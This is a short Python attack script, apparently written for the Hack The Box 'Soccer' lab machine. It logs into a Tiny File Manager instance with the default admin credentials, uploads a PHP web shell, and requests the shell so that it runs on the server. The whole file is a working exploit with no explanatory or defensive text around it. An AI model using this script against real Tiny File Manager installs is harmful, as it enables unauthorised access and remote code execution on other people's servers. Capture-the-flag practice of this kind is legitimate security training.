import requests

session = requests.Session()
data = {"fm_usr":"admin","fm_pwd":"admin@123"}
file = {"file":open("shell.php","r")}
value = {"p":"tiny/uploads","fullpath":"shell.php"}
params = 'p=tiny/uploads'

print('[+] Try to login')
session.post('http://soccer.htb/tiny/',data=data)
print('[+] Login successful')

print('[+] Uploading file')
res = session.post('http://soccer.htb/tiny/tinyfilemanager.php',params=params,data=value,files=file)
if 'file upload successful' in res.text:
	print('[+] File upload successful')
else:
	print('[-] File upload failes')


print('[+] Trigger uploaded file')
res = session.get('http://soccer.htb/tiny/uploads/shell.php')
print(res.text)
